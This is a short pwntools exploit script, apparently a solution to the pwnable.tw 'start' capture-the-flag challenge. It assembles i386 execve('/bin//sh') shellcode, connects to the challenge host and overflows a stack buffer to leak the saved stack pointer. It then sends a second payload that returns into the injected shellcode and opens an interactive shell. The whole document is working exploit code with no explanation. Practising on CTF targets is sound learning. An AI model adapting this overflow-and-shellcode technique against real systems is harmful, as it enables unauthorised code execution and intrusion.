from pwn import *
context.update(os='linux', arch='i386')

p = asm("""
 xor ecx, ecx
 mul ecx
 push ecx
 push 0x68732f2f
 push 0x6e69622f  
 mov ebx, esp
 mov al, 11
 int 0x80
""")

# io = process("./start")
io = remote("chall.pwnable.tw", 10000)


io.sendafter("Let's start the CTF:", '\x90'*0x14 + p32(0x08048087))
sesp = u32(io.recv(4))
print "saved esp: {}".format(hex(sesp))

io.send('\x90'*0x14 + p32(sesp + 0x14) + p)

io.interactive()


